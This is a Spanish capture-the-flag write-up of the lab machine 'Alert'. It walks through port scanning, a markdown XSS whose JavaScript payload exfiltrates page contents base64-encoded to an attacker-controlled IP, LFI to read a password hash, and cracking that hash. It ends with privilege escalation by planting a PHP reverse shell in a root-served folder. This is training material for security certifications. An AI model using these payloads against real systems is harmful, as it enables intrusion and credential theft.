# Alert

**Sistema Operativo**: Linux

**Dificultad**: Fácil 

**Técnicas Vistas**: XSS - Injection Via Markdown /
Discovering LFI accessible from XSS /
Cracking Hashes /
Exploiting Web Service Executed by Root /
Creating a Malicious php File in Writable Path [Privilege Escalation]

Te prepara para las **Certificaciones**: eJPT /
eWPT<br><br>

![image](https://github.com/user-attachments/assets/7d793b11-5179-4963-bcc7-caeffcc09791)


# Reconocimiento

Utilizando `nmap` escaneamos todos los puertos<br>

![image](https://github.com/user-attachments/assets/80979494-01dc-479f-b4e7-3f2a32954b22)<br>

- `-p-` -> Escanea todos los puertos 
- `-sS` -> escaneo de tipo SYN
- `--open` -> Todos los puertos abiertos
- `--min-rate=5000` -> Manda mínimo 5000 paquetes por segundo
- `-Pn` -> Asume que el host especificado está activo
- `-vvv` -> Aplica triple Verbose 
-  `-n` -> Que no aplique resolución DNS
- `-oG allports` -> manda todo a un archivo con nombre de "allports"<br><br>

Utilizando `whatweb` vemos el dominio `http://alert.htb`<br>

![image](https://github.com/user-attachments/assets/66f24ffc-dd2e-4b2c-85b9-058731e0b588)<br>

- Abrimos `vim /etc/hosts` 
- Introducimos el dominio `10.10.11.44 alert.htb`<br><br>

# XSS 

Creo un `test.md` que contenga:<br>

`<script src="http://10.10.14.32/santi.js"></script>`

Creo un `santi.js` que contenga:<br>

```
var req = new XMLHttpRequest();
req.open('GET', 'http://alert.htb/index.php?pages=messages', false);
req.send();

var exfil = new XMLHttpRequest();
exfil.open('GET', 'http://10.10.14.32/?b64=' + btoa(req.responseText), false);
exfil.send();
```

Envió el `test.md`<br>

![image](https://github.com/user-attachments/assets/4241138b-d066-4d86-9b13-ea376f7911ef)<br>

Pincho el "Share Markdown":<br>

![image](https://github.com/user-attachments/assets/90d92aa0-5660-4fa9-8280-c8c02713c42b)<br>

Copiamos el Link:<br>

![image](https://github.com/user-attachments/assets/4f06f97b-d60f-4010-9f81-e973065fc274)<br>

Lo pegamos en "Contact US"  y antes de dar "Send", abrimos el puerto 80  con python -> `python3 -m http.server 80`<br>

![image](https://github.com/user-attachments/assets/144f42aa-db45-4308-8ee9-5242fa76966c)<br>

Nos devuelve todo el código html en base64 -> lo volvemos a texto -> vemos una ruta "messages.php?file="<br>

![image](https://github.com/user-attachments/assets/ea1d45dc-05a9-4127-844f-4965f71a383f)<br>

Ponemos la ruta en "santi.js":<br>

![image](https://github.com/user-attachments/assets/aced18fd-478c-4f02-966b-6045ace9ce28)<br>

Encontramos el Subdominio investigando la ruta default de apache.<br>

![image](https://github.com/user-attachments/assets/3ac5c8dd-9241-4139-877d-6102d70e9335)<br>

En esta ruta encontramos el usuario y contraseña cifrada:<br>

![image](https://github.com/user-attachments/assets/e937381d-b3bf-4732-a9d4-479f1b6c1897)<br>

![image](https://github.com/user-attachments/assets/ed4d5f43-d31e-4bec-83f8-103eb73185c9)<br>


# Fuerza bruta con hashcat

`vim hash`<br>

```
albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
```

`hashcat hash /usr/share/wordlists/rockyou.txt --user`

Usuario -> albert<br>
Contraseña -> manchesterunited<br>

`ssh albert@10.10.11.44` y ponemos la contraseña.<br>


# Escalada de privilegios

Con `ss -nltp` vemos un puerto 8080 abierto solo desde la  maquina victima:<br>

![image](https://github.com/user-attachments/assets/1fb6ad23-62de-45de-a4f8-c0cdf16c7048)<br><br>


Tambien vemos que estamos en un grupo "management" y buscamos por ese grupo el que nos muestra unas rutas.<br>

![image](https://github.com/user-attachments/assets/864f345b-41e8-4f87-92e8-7888160052fc)<br><br>

Vemos que tenemos capacidad de escribir y ejecutar en la carpeta "monitors" y que se esta ejecutando un pagina web en 127.0.0.1:8080<br>

![image](https://github.com/user-attachments/assets/4675f161-b88e-4453-b014-fb124ad3d7da)<br><br>

En la carpeta "monitors" creamos un "test.php" que contenga una reverse shell.
Nos ponemos en escucha `nc -nlvp 443`<br>

![image](https://github.com/user-attachments/assets/699ec32e-0a29-47e1-b431-6fb90325f76f)<br>


Ejecutamos la Query en esta ruta `http://127.0.0.1:8080/monitors/test.php`<br>

Flag root:<br>

![image](https://github.com/user-attachments/assets/b54a7e0c-182c-4c9a-9dea-46a45b84555a)<br>








